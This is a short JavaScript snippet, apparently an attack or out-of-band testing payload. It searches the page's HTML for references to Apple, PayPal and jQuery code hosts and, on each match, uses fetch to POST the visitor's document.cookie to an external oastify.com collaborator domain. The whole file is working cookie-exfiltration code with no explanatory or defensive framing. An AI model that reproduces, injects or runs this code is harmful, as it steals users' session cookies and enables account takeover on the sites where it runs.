var reg=/code\.apple.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:'reg'+document.cookie
});
}

var reg2=/code\.paypal.com/ig;
if(document.body.innerHTML.match(reg2) || document.head.innerHTML.match(reg2)){
fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:'reg2'+document.cookie
});
}


var reg3=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg3) || document.head.innerHTML.match(reg3)){
fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:'reg3'+document.cookie
});
}
